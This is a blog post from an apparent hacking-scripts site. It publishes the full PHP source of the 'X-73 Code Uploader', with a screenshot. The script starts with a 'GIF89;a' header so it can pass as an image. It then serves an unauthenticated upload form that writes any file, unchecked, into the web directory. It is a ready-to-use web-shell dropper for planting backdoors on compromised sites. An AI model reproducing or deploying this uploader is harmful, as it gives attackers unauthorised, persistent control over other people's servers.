---
id: 245
title: X-73 Code Uploader
author: admin
layout: post
guid: http://hackingscripts.com/?p=245
permalink: /x-73-code-uploader/
categories:
  - PHP
tags:
  - PHP
  - X-73
---
&#8211;==@[&#8211; X-73 CODE UPLOADER &#8211;]==&#8211;


### X-73 Code Uploader Source Code

{% highlight php linenos %}GIF89;a
<?php
    $myUpload = new maxUpload(); 
    //$myUpload-&gt;setUploadLocation(getcwd().DIRECTORY_SEPARATOR);
    $myUpload-&gt;uploadFile();
?>
<?php
class maxUpload{
    var $uploadLocation;
    
    /**
     * Constructor to initialize class varaibles
     * The uploadLocation will be set to the actual 
     * working directory
     *
     * @return maxUpload
     */
    function maxUpload(){
        $this-&gt;uploadLocation = getcwd().DIRECTORY_SEPARATOR;
    }

    /**
     * This function sets the directory where to upload the file
     * In case of Windows server use the form: c:\\temp\\
     * In case of Unix server use the form: /tmp/
     *
     * @param String Directory where to store the files
     */
    function setUploadLocation($dir){
        $this-&gt;uploadLocation = $dir;
    }
    
    function showUploadForm($msg='',$error=''){
?>
       &lt;div id="container"&gt;
            &lt;div id="header"&gt;&lt;div id="header_left"&gt;&lt;/div&gt;
            &lt;div id="header_main"&gt;SUL-BAR LINK&lt;div id="header_right"&gt;&lt;/div&gt;&lt;/div&gt;
            &lt;div id="content"&gt;
<?php
if ($msg != ''){
    echo '&lt;p class="msg"&gt;'.$msg.'&lt;/p&gt;';
} else if ($error != ''){
    echo '&lt;p class="emsg"&gt;'.$error.'&lt;/p&gt;';

}
?>
&lt;body bgcolor="#000000"&gt;&lt;center&gt;&lt;div style="background-image:url(''); width="1040" height="710" class="shakeimage" onMouseOver="init(this);rattleimage()" onMouseOut="stoprattle(this);top.focus()" onClick="top.focus()" alt="" border="0"&gt;&lt;br&gt;&lt;div
id="example1"&gt;&lt;/div&gt;&lt;p id="example2"&gt;&lt;font face="Papyrus"; color="red"; size="6"&gt;&lt;br&gt;--==@[-- X-73 CODE UPLOADER --]==--

                &lt;form action="" method="post" enctype="multipart/form-data" &gt;
                     &lt;center&gt;
                         &lt;label&gt;File:
                             &lt;input name="myfile" type="file" size="30" /&gt;
                         &lt;/label&gt;
                         &lt;label&gt;
                             &lt;input type="submit" name="submitBtn" class="sbtn" value="Upload" /&gt;
                         &lt;/label&gt;
                     &lt;/center&gt;
                 &lt;/form&gt;
             &lt;/div&gt;
             &lt;div id="footer"&gt;&lt;a href="http://www.sekedar-online.com" target="_blank"&gt;Sulbar-Link&lt;/a&gt;&lt;/div&gt;
         &lt;/div&gt;
<?php
    }

    function uploadFile(){
        if (!isset($_POST['submitBtn'])){
            $this-&gt;showUploadForm();
        } else {
            $msg = '';
            $error = '';
            
            //Check destination directory
            if (!file_exists($this-&gt;uploadLocation)){
                $error = "The target directory doesn't exists!";
            } else if (!is_writeable($this-&gt;uploadLocation)) {
                $error = "The target directory is not writeable!";
            } else {
                $target_path = $this-&gt;uploadLocation . basename( $_FILES['myfile']['name']);

                if(@move_uploaded_file($_FILES['myfile']['tmp_name'], $target_path)) {
                    $msg = basename( $_FILES['myfile']['name']).
                    " File anda sukses di Upload!";
                } else{
                    $error = "Proses Upload terganggu!";
                }
            }

            $this-&gt;showUploadForm($msg,$error);
        }

    }

}
?>
{% endhighlight %}


### X-73 Code Uploader screenshot<figure id="attachment_434" style="width: 604px;" class="wp-caption aligncenter">

[<img src="{{ site.baseurl }}/wp-content/uploads/2014/02/x-73-code-uploader-1024x351.png" alt="X-73 code uploader screenshot" width="604" height="207" class="size-large wp-image-434" />][1]<figcaption class="wp-caption-text">X-73 code uploader screenshot</figcaption></figure>

 [1]: {{ site.baseurl }}/wp-content/uploads/2014/02/x-73-code-uploader.png